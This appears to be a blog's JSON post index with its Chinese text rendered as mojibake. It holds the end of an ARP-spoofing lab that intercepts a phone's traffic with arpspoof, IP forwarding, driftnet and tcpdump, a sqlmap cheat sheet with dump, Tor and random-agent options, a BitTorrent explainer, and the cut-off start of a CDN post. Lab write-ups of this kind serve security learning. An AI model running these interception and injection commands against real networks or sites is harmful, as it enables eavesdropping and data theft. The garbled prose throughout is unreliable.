è¾“æ˜¯é€šè¿‡macåœ°å€è¿›è¡Œå¯»å€çš„ï¼Œè¿™æ ·æ‰€æœ‰å‘é€åˆ°è¢«å‡è£…ä¸»æœºçš„ä¿¡æ¯éƒ½ä¼šé€šè¿‡macåœ°å€å‘é€åˆ°æ¶æ„ä¸»æœºä¸Š å…·ä½“è¿‡ç¨‹è®¾å¤‡ï¼šæ‰‹æœºä¸€å°ï¼Œç”µè„‘ä¸€å°ï¼Œæ ‘è“æ´¾ä¸€ä¸ª è¯´æ˜ï¼š æ‰‹æœºå……å½“å—å®³è€…ï¼ˆipï¼š192.168.137.116ï¼‰ ç”µè„‘å……å½“ç½‘å…³ï¼ˆå¼€çƒ­ç‚¹ ipï¼š192.168.137.1ï¼‰ æ ‘è“æ´¾ä½œä¸ºæ”»å‡»æœºå™¨ï¼ˆipï¼š192.168.137.66ï¼‰ ä½¿ç”¨ç¨‹åºï¼šarpspoof(éœ€è¦å®‰è£…dsniffä¸ssldump)ï¼Œtcpdumpï¼Œdriftnet ä¸ºä»€ä¹ˆéœ€è¦æ ‘è“æ´¾ï¼Ÿ æœ¬æ¥æ‰“ç®—ç”¨vmwareæ¨¡æ‹Ÿæ‰€æœ‰çš„ä¸»æœºçš„ï¼Œä½†æ˜¯ç”±äºå±€åŸŸç½‘çš„é…ç½®é—®é¢˜æ— æ³•ç”¨vmwareæ¨¡æ‹Ÿæ‰€æœ‰æœºå™¨ï¼Œæ¨¡æ‹Ÿä¸€éƒ¨åˆ†çš„è¯åˆä¼šå› ä¸ºå±€åŸŸç½‘çš„é—®é¢˜å¯¼è‡´è™šæ‹Ÿæœºä¸ç‰©ç†æœºæ— æ³•è¿›è¡Œæ­£å¸¸é€šä¿¡ï¼Œæ‰€ä»¥å°±æ‹¿å‡ºäº†æˆ‘åƒç°å¤šå¹´çš„åŸç”Ÿæ ‘è“æ´¾ é¦–å…ˆä½¿ç”¨nmapæ‰«æå—å®³è€… ç¡®å®šäº†å—å®³è€…çš„ipä¹‹åä½¿ç”¨å‘½ä»¤ arpspoof -i [ç½‘å¡ï¼ˆæ­¤å¤„ä¸ºwlan0ï¼‰] -t [ç›®æ ‡ip] [ç½‘å…³ip] è¿›è¡Œæ¬ºéª— 1sudo arpspoof -i wlan0 -t 192.168.137.116 192.168.137.1 å¦‚æœä»…ä»…åªæ˜¯æƒ³å¯¹ç›®æ ‡ä¸»æœºè¿›è¡Œæ–­ç½‘æ“ä½œçš„è¯æ— éœ€å…¶ä»–æ“ä½œï¼Œä½†æ˜¯å¦‚æœæƒ³è¿›è¡ŒåŒå‘çš„æ¬ºéª—ï¼ˆä¸­é—´äººæ”»å‡»ï¼‰ï¼Œå°±å¿…é¡»æ‰“å¼€æ ‘è“æ´¾çš„è½¬å‘åŠŸèƒ½ï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š 1echo 1 &gt; /proc/sys/net/ipv4/ip_forward ç„¶åå†æ‰“å¼€å¦ä¸€ä¸ªçª—å£ï¼Œå®‰è£…driftnet 12sudo apt install driftnetsudo driftnet -i [ç›‘å¬ç½‘å¡] -a -d [æˆªå–çš„å›¾ç‰‡çš„å­˜æ”¾ç›®å½•] è¿™æ ·å°±å¯ä»¥è·å–å—å®³è€…æ­¤æ—¶çš„å›¾ç‰‡äº† å¦‚æœç”¨æ ‘è“æ´¾æŸ¥çœ‹å›¾ç‰‡ä¸æ–¹ä¾¿ï¼Œå¯ä»¥æ‰“å¼€80ç«¯å£ï¼ŒæŠŠå›¾ç‰‡æ”¾åˆ°ç½‘ç«™æ ¹ç›®å½•ä¸‹å†ä»æµè§ˆå™¨è®¿é—® å®é™…ä¸Šåœ¨æˆ‘è¿›è¡Œå®éªŒæ—¶ï¼Œæˆªå›¾è·å–å¾—å¹¶ä¸æ˜¯å¾ˆé¡ºåˆ©ï¼Œæ‰€ä»¥æˆ‘é€‰æ‹©äº†å¦å¤–ä¸€ç§è·å–é€šä¿¡ä¿¡æ¯çš„æ–¹å¼â€”â€”tcpdump åœ¨arpspoofå‘½ä»¤è¿è¡Œçš„æ—¶å€™ï¼Œç”±äºå—å®³è€…ä¸ç½‘å…³çš„æ‰€æœ‰é€šä¿¡éƒ½ä¼šç»è¿‡æ”»å‡»æœºçš„ç½‘å¡ï¼Œæ•…æˆ‘ä»¬å¯ä»¥ç”¨tcpdumpæ¥è·å–æœ¬åœ°ç½‘å¡æ¥æ”¶åˆ°çš„ä¿¡æ¯ã€‚å‘½ä»¤å¦‚ä¸‹ï¼š 1sudo tcpdump -i wlan0 -s 0 -w e.cap wlan0æ˜¯ç½‘å¡ï¼Œe.capæ˜¯æŠ“åŒ…å­˜æ”¾çš„æ–‡ä»¶åç§°ï¼Œå›è½¦ä¹‹åä¾¿å¼€å§‹æŠ“åŒ…ï¼Œç­‰åˆ°ä»€ä¹ˆæ—¶å€™è§‰å¾—å·®ä¸å¤šäº†å°±crtl+Cåœæ­¢å°±è¡Œï¼Œæ­¤æ—¶åœ¨å½“å‰ç›®å½•ä¸‹åº”è¯¥ä¼šå‡ºç°åˆšåˆšæŠ“åŒ…çš„æ–‡ä»¶ï¼ˆæ­¤å¤„ä¸ºe.capï¼‰ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤è¯»å–ï¼š 1sudo tcpdump -A -r e.cap -Aæ˜¯ä»¥asciiå½¢å¼æ˜¾ç¤º -råé¢çš„æ˜¯è¦æ‰“å¼€çš„æ–‡ä»¶ï¼Œé™¤äº†è¿™ç§æ‰“å¼€æ–¹å¼ï¼Œè¿˜æœ‰ç±»ä¼¼è¿‡æ»¤å™¨çš„åŠŸèƒ½ 1sudo tcpdump -n dst host 119.91.135.95 -r e.cap è¯¥å‘½ä»¤è¿‡æ»¤äº†ipä¸º119.91.135.95çš„é€šä¿¡ä¿¡æ¯å¹¶æ˜¾ç¤ºåœ¨å±å¹•ä¸Š ä»¥ä¸Šæ˜¯ä¼ è¾“è¿‡ç¨‹ä¸­æˆªå–çš„ä¿¡æ¯ quoteARPæ¬ºéª—_ç™¾åº¦ç™¾ç§‘ (baidu.com) kaili linuxä½¿ç”¨arpspoofè¿›è¡Œarpæ¬ºéª— - é—»æ‰€æœªé—» - åšå®¢å›­ (cnblogs.com) ARPâ€“åˆ©ç”¨arpspoofå’Œdriftnetå·¥å…·è¿›è¡Œarpæ¬ºéª—_mr_xiukçš„åšå®¢-CSDNåšå®¢_arpspoof kali linuxæ“ä½œç³»ç»Ÿä¸­TCPDUMPè¯¦ç»†ä½¿ç”¨æ–¹æ³•_éš”å£è€æ¹¿çš„æŠ€æœ¯åšå®¢_51CTOåšå®¢ Kaliæ¸—é€-ARPæ–­ç½‘æ”»å‡»ä¸ç›‘å¬_Tr0eçš„åšå®¢-CSDNåšå®¢_kaliå±€åŸŸç½‘æ¸—é€ç›‘æ§ kali linuxä¸‹çš„arpæ”»å‡» - é€—æ¯”å¤§å¸ˆ - åšå®¢å›­ (cnblogs.com)","categories":[],"tags":[{"name":"Internet","slug":"Internet","permalink":"http://uniqueland.top/tags/Internet/"}]},{"title":"SqlmapåŸºæœ¬æ“ä½œ","slug":"sqlmap","date":"2022-03-29T02:24:19.004Z","updated":"2024-11-09T19:31:57.605Z","comments":true,"path":"2022/03/29/sqlmap/","link":"","permalink":"http://uniqueland.top/2022/03/29/sqlmap/","excerpt":"","text":"å®‰è£…Linux / Mac OS1git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev Windowså®‰è£…git-bashä¹‹ååœ¨é€‰å®šç›®å½•ä¸‹å³é”®æ‰“å¼€git-bashçª—å£è¿è¡Œä¸Šè¿°å‘½ä»¤å³å¯ ä¸‹è½½åœ°å€ï¼š https://github.com/git-for-windows/git/releases/download/v2.35.1.windows.2/Git-2.35.1.2-64-bit.exe å¸¸ç”¨å‘½ä»¤1234567python sqlmap.py -h # è·å–å¸¸è§é€‰é¡¹python sqlmap.py -hh # è·å–æ‰€æœ‰é€‰é¡¹python sqlmap.py -u www.example.com # æ£€æµ‹GETæ³¨å…¥python sqlmap.py -u www.example.com --batch # ä½¿ç”¨é»˜è®¤é€‰é¡¹ï¼ˆä¸ç”¨æ‰‹åŠ¨é€‰æ‹©y/nï¼‰python sqlmap.py -u www.example.com --batch --dbs --tables --columns # è¿”å›æ•°æ®åº“/è¡¨/åˆ—python sqlmap.py -u www.example.com --batch -D xxx -T xxx -C xxx # æŒ‡å®šæ•°æ®åº“/è¡¨/åˆ—python sqlmap.py -u www.example.com --batch --dump # ç›´æ¥è¿”å›æ•°æ®åº“å†…å®¹ æ³¨ï¼šå¦‚æœæ˜¯åœ¨Linuxç³»ç»Ÿä¸‹ï¼Œpythonå‘½ä»¤å¯èƒ½è°ƒç”¨çš„æ˜¯python2ï¼Œå¦‚æœæŠ¥é”™å¯å°†pythonæ¢ä¸ºpython3 â€‹ å¦‚æœæœ‰å…¶ä»–æŠ¥é”™ï¼Œå°è¯•å°†ç½‘å€ç­‰å‚æ•°ç”¨åŒå¼•å·åŒ…è£¹ â€‹ Windowsä¸‹å¯åœ¨å‘½ä»¤æç¤ºç¬¦æˆ–powershellä¸‹è¿è¡Œ åœ¨è¿”å›æ•°æ®åº“/è¡¨/åˆ—æ—¶ï¼Œå¯åªæŒ‡å®šä¸€é¡¹ åœ¨æŒ‡å®šæ•°æ®åº“/è¡¨/åˆ—æ—¶ï¼Œä¹Ÿå¯åªæŒ‡å®šä¸€é¡¹ ä¸€èˆ¬å°†dumpé€‰é¡¹å’Œä¸Šè¿°å‘½ä»¤ç»“åˆï¼Œç›´æ¥è¿”å›æ³¨å…¥ç»“æœ æ›´å¤šç©æ³•12345678910python sqlmap.py -m 1.txt # ä»æ–‡ä»¶ä¸­å¯¼å…¥urlpython sqlmap.py -r res.txt # ä»æ–‡ä»¶ä¸­å¯¼å…¥httpå“åº”python sqlmap.py -l burp.txt # ä»æ–‡ä»¶ä¸­å¯¼å…¥burpæŠ“åŒ…æ–‡ä»¶python sqlmap.py -u www.example.com --data=&quot;id=1&quot; # ä½¿ç”¨POSTæ³¨å…¥python sqlmap.py -u www.example.com --level 2 # ä½¿ç”¨2çº§æ³¨å…¥ï¼Œæ£€æµ‹cookieæ³¨å…¥python sqlmap.py -u www.example.com --level 3 # ä½¿ç”¨3çº§æ³¨å…¥ï¼Œæ£€æµ‹refereræ³¨å…¥å’ŒUSER-AGENTæ³¨å…¥python sqlmap.py -u www.example.com --level 5 # ä½¿ç”¨5çº§æ³¨å…¥ï¼Œæ£€æµ‹hostæ³¨å…¥python sqlmap.py -u www.example.com --random-agent # ä½¿ç”¨éšæœºä»£ç†python sqlmap.py -u www.example.com --tor # ä½¿ç”¨åŒ¿åtorç½‘ç»œpython sqlmap.py -u www.example.com --hpp # æ£€æµ‹httpæ±¡æŸ“ levelé»˜è®¤ä¸º1ï¼ŒèŒƒå›´ä¸º 1 - 5 æ›´å¤šç”¨æ³•å’Œå‘½ä»¤å¯å‚ç…§å®˜ç½‘æ–‡æ¡£ï¼šhttp://sqlmap.org/ quoteGitHub - sqlmapproject/sqlmap: Automatic SQL injection and database takeover tool sqlmapè¯¦ç»†ä½¿ç”¨æ•™ç¨‹_æ˜Ÿè½.çš„åšå®¢-CSDNåšå®¢_sqlmap è¶…è¯¦ç»†SQLMapä½¿ç”¨æ”»ç•¥åŠæŠ€å·§åˆ†äº« - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·","categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://uniqueland.top/tags/web/"},{"name":"ctf","slug":"ctf","permalink":"http://uniqueland.top/tags/ctf/"}]},{"title":"æœ‰å…³BTç§å­çš„ä¸€äº›äº‹","slug":"bit_torrent","date":"2022-03-27T11:51:10.696Z","updated":"2024-11-09T19:33:03.709Z","comments":true,"path":"2022/03/27/bit_torrent/","link":"","permalink":"http://uniqueland.top/2022/03/27/bit_torrent/","excerpt":"","text":"Bit Torrent (BTç§å­)æ˜¯ä»€ä¹ˆï¼Ÿ BitTorrent(ç®€ç§°BT)æ˜¯ä¸€ä¸ªæ–‡ä»¶åˆ†å‘åè®®ï¼Œæ¯ä¸ªä¸‹è½½è€…åœ¨ä¸‹è½½çš„åŒæ—¶ä¸æ–­å‘å…¶ä»–ä¸‹è½½è€…ä¸Šä¼ å·²ä¸‹è½½çš„æ•°æ®ã€‚è€Œåœ¨FTP,HTTPåè®®ä¸­ï¼Œæ¯ä¸ªä¸‹è½½è€…åœ¨ä¸‹è½½è‡ªå·±æ‰€éœ€æ–‡ä»¶çš„åŒæ—¶ï¼Œå„ä¸ªä¸‹è½½è€…ä¹‹é—´æ²¡æœ‰äº¤äº’ã€‚å½“éå¸¸å¤šçš„ç”¨æˆ·åŒæ—¶è®¿é—®å’Œä¸‹è½½æœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶æ—¶ï¼Œç”±äºFTPæœåŠ¡å™¨å¤„ç†èƒ½åŠ›å’Œå¸¦å®½çš„é™åˆ¶ï¼Œä¸‹è½½é€Ÿåº¦ä¼šæ€¥å‰§ä¸‹é™ï¼Œæœ‰çš„ç”¨æˆ·å¯èƒ½è®¿é—®ä¸äº†æœåŠ¡å™¨ã€‚BTåè®®ä¸FTPåè®®ä¸åŒï¼Œç‰¹ç‚¹æ˜¯ä¸‹è½½çš„äººè¶Šå¤šï¼Œä¸‹è½½é€Ÿåº¦è¶Šå¿«ï¼ŒåŸå› åœ¨äºæ¯ä¸ªä¸‹è½½è€…å°†å·²ä¸‹è½½çš„æ•°æ®æä¾›ç»™å…¶ä»–ä¸‹è½½è€…ä¸‹è½½ï¼Œå……åˆ†åˆ©ç”¨äº†ç”¨æˆ·çš„ä¸Šè½½å¸¦å®½ã€‚é€šè¿‡ä¸€å®šçš„ç­–ç•¥ä¿è¯ä¸Šä¼ é€Ÿåº¦è¶Šå¿«ï¼Œä¸‹è½½é€Ÿåº¦ä¹Ÿè¶Šå¿«ã€‚åœ¨å¾ˆçŸ­æ—¶é—´å†…ï¼ŒBitTorrentåè®®æˆä¸ºä¸€ç§æ–°çš„å˜é©æŠ€æœ¯ã€‚ ä»¥ä¸Šè¯´æ˜æ¥è‡ªç™¾åº¦ç™¾ç§‘ ç”¨é€šä¿—çš„è¯è®²ï¼ŒBTç§å­ï¼ˆä»¥ä¸‹ç®€ç§° ç§å­ ï¼‰æŠ€æœ¯å…¶å®å°±æ˜¯å°†ä¸€ä¸ªæ¯”è¾ƒå¤§çš„æ–‡ä»¶ï¼ˆæ¯”å¦‚ç”µå½±æˆ–é•œåƒï¼‰æŒ‰ç…§ä¸€å®šçš„è§„èŒƒåˆ†æˆå¤šä¸ªå—ï¼Œå½“ç”¨æˆ·é€šè¿‡.torrentæ–‡ä»¶ä¸‹è½½æ—¶ï¼Œä¼šè¿æ¥ä¸Šç§å­æ–‡ä»¶ä¸­è®°å½•çš„trackeræœåŠ¡å™¨ï¼Œè€ŒtrackeræœåŠ¡å™¨å¹¶ä¸æä¾›æ–‡ä»¶æœ¬èº«ï¼Œè€Œæ˜¯é€šè¿‡æŸ¥è¯¢è¿”å›å½“å‰åŒåœ¨ä¸‹è½½è¯¥æ–‡ä»¶çš„å…¶ä»–å®¢æˆ·ç«¯çš„åœ°å€ï¼Œè€Œä¸»æœºæ¥æ”¶åˆ°è¯¥åœ°å€åï¼Œä¼šé€ä¸ªé€ä¸ªå°è¯•è¿æ¥ï¼Œè¿æ¥æˆåŠŸçš„ä¾¿é€šè¿‡ç‚¹å¯¹ç‚¹ï¼ˆP2Pï¼‰çš„æ–¹å¼è·å–å¯¹æ–¹è®¡ç®—æœºä¸Šçš„å¦ä¸€éƒ¨åˆ†æ–‡ä»¶ï¼Œç„¶åå†è¿æ¥å…¶ä»–çš„å®¢æˆ·ç«¯ï¼Œè·å–æ–‡ä»¶çš„å…¶ä»–éƒ¨åˆ† Bit Torrent ä¸å…¶ä»–ä¸‹è½½æ–¹å¼ç›¸æ¯”ï¼Œæœ‰ä»€ä¹ˆä¼˜åŠ¿ï¼Ÿä¸åŒäºä¼ ç»Ÿçš„ C/S ( Client / Server )æ¨¡å¼ï¼ŒP2Pçš„ä¸‹è½½æ–¹å¼é¿å…äº†å•ä¸ªæœåŠ¡å™¨æä¾›å¤šä¸ªå®¢æˆ·ç«¯çš„æœåŠ¡æ—¶å¸¦å®½è´Ÿè½½å¤§çš„é—®é¢˜ï¼›åœ¨P2Pä¸‹è½½æ—¶ï¼Œæ¯ä¸€å°è®¡ç®—æœºï¼Œæ—¢æ˜¯å®¢æˆ·ç«¯ï¼Œåˆæ˜¯æœåŠ¡ç«¯ï¼Œåœ¨ä¸‹è½½çš„è¿‡ç¨‹ä¸­ï¼Œä¹Ÿå‘å…¶ä»–æœ‰éœ€è¦çš„å®¢æˆ·ç«¯ä¸Šä¼ è‡ªå·±çš„æ–‡ä»¶ï¼Œæœ‰æ•ˆèŠ‚çœäº†å¸¦å®½ï¼› å¦å¤–ï¼Œç”±äºP2På»ä¸­å¿ƒåŒ–çš„ç‰¹ç‚¹ï¼Œæ¯ä¸ªå¤„äºBTç½‘ç»œä¸­çš„æ–‡ä»¶ï¼Œå…¶å­˜åœ¨ä¸å¦ä¸å†å–å†³äºæ–‡ä»¶çš„æä¾›è€…æˆ–æœåŠ¡å•†ï¼Œåœ¨ä¸€å®šç¨‹åº¦ä¸Šé¿å…äº†æ–‡ä»¶å› ä¸ªäººè¿‡å¤±è€Œæ°¸ä¹…æ¶ˆå¤±çš„æƒ…å†µ Bit Torrent ä¸å…¶ä»–ä¸‹è½½æ–¹å¼ç›¸æ¯”ï¼Œæœ‰ä»€ä¹ˆåŠ£åŠ¿ï¼Ÿæœ‰ä¼˜åŠ¿å°±è‚¯å®šæœ‰åŠ£åŠ¿ï¼Œå¦‚ä¸Šæ–‡æ‰€è¯´ï¼ŒBTä¸‹è½½æ˜¯é€šè¿‡åŒåœ¨ä¸‹è½½è¯¥æ–‡ä»¶çš„å…¶ä»–å®¢æˆ·ç«¯æä¾›çš„æœåŠ¡æ¥è·å–æ–‡ä»¶çš„ï¼Œé‚£ä¹ˆï¼Œå½“åŒæ—¶åœ¨ä¸‹è½½è¯¥æ–‡ä»¶çš„å®¢æˆ·ç«¯å¾ˆå°‘ï¼Œç”šè‡³æˆ‘ä»¬å¯ä»¥å‡è®¾ä¸€ç§æç«¯æƒ…å†µï¼šæ•´ä¸ªç½‘ç»œå°±åªæœ‰ä½ ä¸€å°è®¡ç®—æœºåœ¨ä¸‹è½½è¯¥æ–‡ä»¶ï¼Œé‚£ä¹ˆä½ å°†ä¸ä¼šå¾—åˆ°ä½ æƒ³è¦çš„æ–‡ä»¶ï¼Œå› ä¸ºæ²¡æœ‰å…¶ä»–èŠ‚ç‚¹ç»™ä½ æä¾›ä½ æƒ³è¦çš„æ–‡ä»¶ å¦ä¸€æ–¹é¢ï¼ŒåŒæ ·ç”±äºBTæŠ€æœ¯ä¸­æ–‡ä»¶æ— æ³•è½»æ˜“æ¸…é™¤çš„ç‰¹ç‚¹ï¼Œæ–‡ä»¶ä¸€æ—¦ä¸Šä¼ ï¼Œæƒ³æ°¸ä¹…æŠ¹å»çš„å¯èƒ½æ€§ä¸å¤§ï¼Œé‚£ä¹ˆä¸‡ä¸€æœ‰ä¸æ³•åˆ†å­ä¸Šä¼ äº†æœ¬ä¸è¯¥å‡ºç°åœ¨ç½‘ç»œä¸Šçš„æ–‡ä»¶ï¼ˆæ¯”å¦‚æœ‰å…³å›½å®¶æœºå¯†æˆ–è€…ä¸ªäººéšç§ï¼Œæœ‰æˆ–è€…æœªä¸Šæ˜ çš„ç”µå½±ä¹‹ç±»çš„ï¼‰ï¼Œå…¶åæœä¸å ªè®¾æƒ³ torrentæ–‡ä»¶éƒ½è®°å½•äº†ä»€ä¹ˆï¼ŸAï¼‰è¿™ä¸ªæ–‡ä»¶ï¼ˆæ–‡ä»¶å¤¹ï¼‰ä¸­æ•°æ®çš„SHA1å€¼ï¼Œæ¯”å¦‚ä¸€ä¸ª1Gçš„æ–‡ä»¶ï¼Œå¦‚æœæŒ‰1Mæ¯å—è¿›è¡Œåˆ†å—ï¼Œåˆ™ä¼šè¢«åˆ†ä¸ºäº†1000å—ï¼Œtorrentä¸­å°±ä¼šæœ‰è¿™1000ä¸ªæ•°æ®å—çš„æŒ‡çº¹å€¼ï¼ˆSHA1çš„hashå€¼ï¼‰ï¼Œè¿™ä¸ªå æ®äº†torrentæ–‡ä»¶çš„ç»å¤§éƒ¨åˆ†ç©ºé—´ã€‚è¿™äº›å€¼çš„ç›®çš„æ˜¯ä¸ºäº†ä¸‹è½½çš„è¿‡ç¨‹ä¸­è¿›è¡Œæ•°æ®æ ¡éªŒï¼Œç¡®ä¿æ•°æ®æ”¶åˆ°çš„å’Œå½“æ—¶æºå¤´åˆ¶ä½œtorrentæ—¶çš„æºæ–‡ä»¶100%ä¸€è‡´ï¼Œé˜²æ­¢æ¶æ„æ•°æ®æ”»å‡»ã€‚ Bï¼‰ä¸€èˆ¬åˆ¶ä½œtorrentæ–‡ä»¶æ—¶ï¼Œè¿˜ä¼šè¦æŒ‡å®šä¸€ä¸ªæˆ–è€…å¤šä¸ªTrackerçš„åœ°å€ï¼Œæ¯”å¦‚http://www.a.com:8080/announceè¿™ç§åœ°å€ã€‚torrenté‡Œé¢ä¸€èˆ¬ä¹Ÿä¼šå­˜å‚¨äº†è¿™ä¸ªä¿¡æ¯ï¼Œè¿™ä¸ªå…¶å®ä¹Ÿå°¤ä¸ºé‡è¦ã€‚ç›¸å½“äºè®°å½•äº†ä¸€ä¸ªé—®è¯¢æœåŠ¡å™¨çš„åœ°å€ï¼Œè¿™ä¸ªé—®è¯¢æœåŠ¡å™¨çš„ä½œç”¨ï¼Œåé¢æˆ‘å†è§£é‡Šã€‚ Cï¼‰æ–‡ä»¶æˆ–è€…æ–‡ä»¶å¤¹å†…æ¯ä¸ªæ–‡ä»¶çš„åå­—ï¼Œæ–¹ä¾¿ä¸‹è½½æ–‡ä»¶æ—¶ï¼Œç£ç›˜ä¸Šç›´æ¥å‘½åå¥½è·ŸåŸå§‹æ•°æ®ä¸€æ ·çš„ç›®å½•ç»“æ„ã€æ–‡ä»¶åã€‚ Dï¼‰å…¶å®ƒä¸€äº›è¾…åŠ©å’Œå¯æ‰©å±•çš„ä¿¡æ¯ï¼Œæ¯”å¦‚å¯ä»¥é…ç½®ä¸€ä¸ªP2SPçš„httpåœ°å€è¾…åŠ©ä¸‹è½½ï¼Œæ¯”å¦‚åˆ¶ä½œè½¯ä»¶çš„åå­—ã€å¤‡æ³¨â€¦â€¦ã€‚ Eï¼‰ä¸Šé¢ä¿¡æ¯ç”Ÿæˆåï¼Œtorrentä¼šæŠŠAï¼‰é‡Œé¢çš„è¿™äº›ä¿¡æ¯ï¼Œä»¥åŠtorrenté‡Œé¢çš„æ–‡ä»¶åç­‰å…³é”®ä¿¡æ¯ï¼Œå†è¿›è¡Œä¸€æ¬¡Hashï¼Œç”Ÿæˆä¸€ä¸ªæ–°çš„SHA1å€¼ï¼Œä½œä¸ºtorrentçš„HASHå€¼ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬ç»å¸¸çœ‹åˆ°çš„ä¸‹è½½è½¯ä»¶é‡Œé¢å¯¹è¿™ä¸ªç§å­å‘½åçš„ä¸€ä¸ªå”¯ä¸€çš„hashå€¼ï¼Œä¹Ÿæœ‰çš„åœ¨magnetè¿™ç§ç£åŠ›é“¾æ¥ä¸­å¯ä»¥çœ‹åˆ°è¿™ä¸ªå€¼ï¼Œè¿™å°±æ˜¯torrentçš„å”¯ä¸€æ ‡è®°ã€‚ ä»¥ä¸Šå°±æ˜¯.torrentæ–‡ä»¶çš„å†…å®¹ï¼Œå¯ä»¥ç”¨è®°äº‹æœ¬æ‰“å¼€ï¼Œä½†å¯èƒ½çœ‹åˆ°ä¹±ç ã€‚è¿™ä¸ªæ–‡ä»¶çš„ç¼–ç éµå¾ªäº†bencodeç¼–ç è§„åˆ™ã€‚ä½†å®é™…å†…å®¹å°±ä¸»è¦æ˜¯ä¸Šé¢è¿™äº›ã€‚æ‰€ä»¥ï¼Œtorrentå¯ä»¥ç†è§£ä¸ºå¯¹åŸå§‹æ•°æ®çš„ä¸€äº›è®°å½•ã€‚ å¦‚æœä¸‹è½½æ—¶æ²¡æœ‰å…¶ä»–èŠ‚ç‚¹åœ¨çº¿ã€‚åˆæ²¡æœ‰httpæœåŠ¡å™¨ï¼Œæ˜¯ä¸æ˜¯å°±ä¸èƒ½è¿›è¡Œä¸‹è½½äº†å‘¢ï¼Ÿä¸ä¸€å®šï¼ŒBTå‘æ˜è€…æå‡ºäº†DHTï¼ˆDistributed Hash Tableï¼‰çš„æ¦‚å¿µï¼Œå°±ç®—Trackerè¿ä¸ä¸Šäº†ï¼Œä¹Ÿå¯ä»¥é€šè¿‡åˆ†å¸ƒå¼å“ˆå¸Œè¡¨DHTæŠ€æœ¯ï¼Œé€šè¿‡DHTç½‘ç»œæ…¢æ…¢çš„å¯»æ‰¾å¿—åŒé“åˆçš„é‚»å±…èŠ‚ç‚¹ï¼Œåªæ˜¯æ²¡æœ‰Trackeré‚£ä¹ˆç›´æ¥é‚£ä¹ˆå¿«é€Ÿï¼Œä½†æ…¢ä¸€äº›æ€»è¿˜æ˜¯æœ‰æœºä¼šæ‰¾åˆ°é‚»å±…çš„ æœ‰å…³ä¸‹è½½è¿‡ç¨‹ä¸­çš„ä¸€äº›äº‹æ–‡ä»¶ä¸‹è½½æ—¶ï¼Œè‹¥å­˜åœ¨æä¾›ä¸‹è½½æœåŠ¡çš„httpæœåŠ¡å™¨ï¼Œé‚£ä¹ˆå°±ç®—æ²¡æœ‰å…¶ä»–çš„å®¢æˆ·ç«¯åœ¨çº¿ï¼Œä¸‹è½½ä»ç„¶å¯ä»¥è¿›è¡Œ ä¸‹è½½è¿‡ç¨‹ä¸­å‡ºç°å¡åœ¨99.99%çš„åŸå› æ˜¯å› ä¸ºå½“æ‰€æœ‰åˆ†å—éƒ½ä¸‹è½½å®Œæ¯•æ—¶ï¼Œç”µè„‘ä¼šå¯¹ä¸‹è½½çš„æ–‡ä»¶è¿›è¡Œæ–‡ä»¶æ ¡éªŒï¼ˆç±»ä¼¼äºå“ˆå¸Œæ£€éªŒï¼‰ï¼Œè€Œå½“æ–‡ä»¶æ ¡éªŒä¸é€šè¿‡æ—¶ï¼Œç”µè„‘å°±ä¼šå¯¹ç»„æˆæ–‡ä»¶çš„æ‰€æœ‰åˆ†å—é€ä¸ªé€ä¸ªè¿›è¡Œæ£€éªŒï¼Œå‘ç°æ ¡éªŒå€¼ä¸å¯¹çš„æ–‡ä»¶åˆ†å—å†é‡æ–°ä¸‹è½½ï¼Œè¿™å°±æ˜¯ä¸ºä»€ä¹ˆæœ‰æ—¶å€™ä¸‹è½½å¡ä½çš„åŸå›  å½“æ–‡ä»¶ä¸‹è½½å®Œæ¯•æ—¶ï¼Œå¦‚æœä½ æ²¡æœ‰å…³é—­ä¸‹è½½æ–‡ä»¶çš„å®¢æˆ·ç«¯ï¼Œé‚£ä¹ˆå¦‚æœæœ‰å…¶ä»–äººéœ€è¦ä½ çš„æ–‡ä»¶ï¼Œå³ä½¿ä½ æ²¡æœ‰åœ¨ä¸‹è½½æ–‡ä»¶ï¼Œä½ æ‰€æ‹¥æœ‰çš„æ–‡ä»¶åˆ†å—ä¾ç„¶å¯ä»¥ä¸Šä¼ ç»™å…¶ä»–å®¢æˆ·ç«¯ï¼Œæˆä¸ºä¸€åå´‡é«˜çš„ä¼ é€’è€… æ–‡ä»¶ä¸‹è½½æ—¶ï¼Œå½±å“ä¸‹è½½é€Ÿåº¦çš„ï¼Œé™¤äº†ä½ çš„ç”µè„‘å½“å‰çš„ç½‘é€Ÿï¼Œå…¶å®è¿˜æœ‰ä½ çš„ç”µè„‘å½“å‰çš„ä¸Šä¼ é€Ÿåº¦ï¼›åœ¨BTç½‘ç»œçš„å¸¦å®½åˆ†é…ä¸­ï¼Œä¸Šä¼ é€Ÿåº¦å¿«çš„å®¢æˆ·ç«¯èƒ½å¤Ÿè·å¾—çš„ä¸‹è½½é€Ÿåº¦ä¼šç›¸å¯¹æ¯”è¾ƒå¿« æŸäº›è¿è¥å•†ä¼šå¯¹BTä¸‹è½½æ—¶çš„é€šä¿¡è¿›è¡Œæ‹¦æˆªï¼Œå®ƒä»¬ä¼šå¯¹é€šä¿¡è¿‡ç¨‹ä¸­ä¼ è¾“çš„å†…å®¹è¿›è¡Œåˆ†æï¼Œç”±äºæ—©æœŸçš„ä¸‹è½½ä¼ è¾“çš„æ˜¯æ˜æ–‡ï¼Œæ•…å¾ˆå®¹æ˜“å°±èƒ½å¤Ÿè¢«è¿è¥å•†æˆªå–ï¼›å½“ç„¶ï¼Œé“é«˜ä¸€å°ºï¼Œé­”é«˜ä¸€ä¸ˆï¼Œå¦‚ä»Šçš„ä¸‹è½½è¿‡ç¨‹ä¼ è¾“çš„å†…å®¹å¤§éƒ¨åˆ†éƒ½è¿›è¡Œè¿‡åŠ å¯† quoteBitTorrent_ç™¾åº¦ç™¾ç§‘ (baidu.com) https://www.zhihu.com/question/49829233/answer/160765176","categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://uniqueland.top/tags/web/"}]},{"title":"æœ‰å…³cdnå’ŒçœŸå®ipçš„ä¸€äº›äº‹","slug":"cdn","date":"2022-03-20T06:21:18.883Z","updated":"2024-11-09T19:33:26.863Z","comments":true,"path":"2022/03/20/cdn/","link":"","permalink":"http://uniqueland.top/2022/03/20/cdn/","excerpt":"","text":"CDNæ˜¯ä»€ä¹ˆï¼Ÿ CDN(Content Delivery 